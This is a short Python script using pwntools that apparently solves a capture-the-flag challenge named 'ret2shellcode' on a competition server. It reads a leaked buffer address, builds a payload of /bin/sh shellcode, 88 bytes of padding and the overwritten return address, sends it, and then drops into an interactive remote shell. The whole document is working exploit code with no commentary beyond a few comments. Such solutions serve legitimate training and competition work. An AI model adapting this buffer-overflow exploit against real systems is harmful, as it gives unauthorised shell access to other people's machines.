from pwn import *

context.arch = "amd64"
context.log_level = "debug"

io = remote("skillsusa.cybr.club", 443, ssl=True, sni="ret2shellcode")

# Receive the line containing the buffer address
line = io.recvline().decode()
buffer_addr = int(line.split(": ")[1], 16)
log.info(f"Buffer address: {hex(buffer_addr)}")

io.recvuntil(b"Enter your message:\n\n")

# /bin/sh
shellcode = asm(shellcraft.sh())

# Calculate padding (80 bytes buffer + 8 bytes for saved rbp)
padding_size = 80 + 8 - len(shellcode)
payload = shellcode + b"A" * padding_size + p64(buffer_addr)

io.sendline(payload)

io.interactive(prompt="")
